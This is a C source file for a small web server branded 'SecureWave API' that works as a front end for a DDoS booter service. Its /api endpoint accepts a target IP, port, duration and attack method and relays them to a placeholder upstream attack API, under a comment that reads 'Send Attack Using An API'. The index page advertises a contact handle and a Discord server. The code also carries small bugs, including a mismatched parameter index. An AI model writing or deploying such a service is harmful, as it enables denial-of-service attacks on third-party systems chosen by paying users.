#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#include <clib/String/str.h>
#include <clib/Net/web.h>
#include <clib/Map/map.h>
#include <clib/Net/request.h>

Map 	*headers;
str	    *buffer;
str     *USER_IP;

void *index_page(HTTPServer *s, HTTPRequest *r, int request_socket) {
    write(request_socket, 
        "Welcome to SecureWave API....\nFor More Info, Contact: skeedybob_86610 or join our discord (discord.gg/ovpn)", 
        strlen("Welcome to SecureWave API....\nFor More Info, Contact: skeedybob_86610 or join our discord (discord.gg/ovpn)"));
}

/* API Funneling */
HTTPClientResponse *funnel_api(const char *ip, const char *port, const char *time, const char *method) {
    str *api_url = string("https://YOUR_API_HERE.com/api?host=");
    char *para[] = {ip, "&port=", port, "&time=", time, "&method=", method};
    for(int i = 0; i < 7; i++)
        api_url->AppendString(api_url, para[i]);

    HTTPClientResponse *r = RequestURL(api_url->data, NULL, __GET);
    return r;
}

void *api_endpoint(HTTPServer *s, HTTPRequest *r, int request_socket) {
    USER_IP = string(r->headers->Utils(r->headers, __GET_KEY_VALUE, "Host"));
    printf("[ \x1b[32m/api\x1b[0m ] Client Request %s\n", USER_IP->data);

    /* Check for GET parameters */
    if(retrieve_get_parameter(s, r) > 0 && r->queries->idx == 4) {
        /* Construct a response */
        buffer = string(NULL);
        char *t[] = {
            "Response: ", 
            (char *)r->queries->Utils(r->queries, __GET_KEY_VALUE, "ip"),
            ", ",
            (char *)r->queries->Utils(r->queries, __GET_KEY_VALUE, "port"),
            ", ",
            (char *)r->queries->Utils(r->queries, __GET_KEY_VALUE, "time"),
            ", ",
            (char *)r->queries->Utils(r->queries, __GET_KEY_VALUE, "method")
        };
        for(int i = 0; i < 8; i++)
            buffer->AppendString(buffer, t[i]);

        /* Display IP for Demo */
        buffer->AppendString(buffer, "\nUser IP: ");
        buffer->AppendString(buffer, USER_IP->data == NULL ? "N/A": USER_IP->data);

        /* Send Attack Using An API */
        HTTPClientResponse *resp = funnel_api(t[1], t[3], t[5], t[6]);
        if(resp->status_code != 200) {
            write(request_socket, "[ x ] Error, Something went wrong. Contact Owner!", strlen("[ x ] Error, Something went wrong. Contact Owner!"));
            return NULL;
        }

        /* Send Response */
        if(buffer != NULL)
            write(request_socket, buffer->data, strlen(buffer->data));

        return NULL;
    }

   write(request_socket, "[ x ] Error, Something went wrong. Contact Owner!", strlen("[ x ] Error, Something went wrong. Contact Owner!"));
}

int main() {
    HTTPServer *api = StartWebServer(NULL, 80, 0);

    AddRoute(api, "/index", index_page);
    AddRoute(api, "/api", api_endpoint);

    StartListener(api);
    return 0;
}
